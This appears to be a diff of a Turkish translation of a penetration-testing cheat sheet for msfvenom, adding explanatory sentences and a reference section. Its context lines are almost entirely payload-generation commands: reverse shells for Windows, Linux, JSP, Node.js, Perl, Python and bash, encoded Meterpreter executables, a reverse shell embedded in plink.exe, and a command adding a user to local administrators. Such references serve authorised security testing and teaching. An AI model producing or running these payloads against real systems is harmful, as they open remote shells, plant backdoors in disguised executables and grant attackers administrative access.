@@ -1,20 +1,20 @@
 # MSFVenom - CheatSheet
 
-{{#include ../../banners/hacktricks-training.md}}
-
 ---
 
 ## Temel msfvenom
 
 `msfvenom -p <PAYLOAD> -e <ENCODER> -f <FORMAT> -i <ENCODE COUNT> LHOST=<IP>`
 
-Mimariyi belirtmek için `-a` veya `--platform` da kullanılabilir.
+Payload architecture'ını seçmek için `-a`, hedef platformunu seçmek için `--platform` kullanın.<sup>[[1]](#references)</sup>
 
 ## Listeleme
 ```bash
 msfvenom -l payloads #Payloads
 msfvenom -l encoders #Encoders
 ```
+Bu komutlar, kurulu framework'te kullanılabilir olan payload ve encoder modüllerini listeler.<sup>[[1]](#references)</sup>
+
 ## shellcode oluştururken kullanılan yaygın parametreler
 ```bash
 -b "\x00\x0a\x0d"
@@ -23,6 +23,8 @@ msfvenom -l encoders #Encoders
 EXITFUNC=thread
 PrependSetuid=True #Use this to create a shellcode that will execute something with SUID
 ```
+Burada gösterilen flag'ler kötü karakterleri, çıktı formatını, encoder'ı ve encoding yinelemelerini seçer.<sup>[[1]](#references)</sup>
+
 ## **Windows**
 
 ### **Reverse Shell**
@@ -50,11 +52,11 @@ msfvenom -a x86 --platform Windows -p windows/exec CMD="net localgroup administr
 ```bash
 msfvenom -p windows/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 -f exe > encoded.exe
 ```
-### Executable içine gömülü
+### Çalıştırılabilir dosyanın içine gömülü
 ```bash
 msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -x /usr/share/windows-binaries/plink.exe -f exe -o plinkmeter.exe
 ```
-## Linux Payload'ları
+## Linux Payloads
 
 ### Reverse Shell
 ```bash
@@ -111,7 +113,7 @@ msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f w
 ```bash
 msfvenom -p nodejs/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port)
 ```
-## **Script Language payload'ları**
+## **Script Dili payload'ları**
 
 ### **Perl**
 ```bash
@@ -125,4 +127,7 @@ msfvenom -p cmd/unix/reverse_python LHOST=(IP Address) LPORT=(Your Port) -f raw 
 ```bash
 msfvenom -p cmd/unix/reverse_bash LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.sh
 ```
+## References
+
+- [1] [msfvenom nasıl kullanılır](https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom/eb69bce6cf0d2ba0e876c57b87793bf31c915bb7)
 {{#include ../../banners/hacktricks-training.md}}
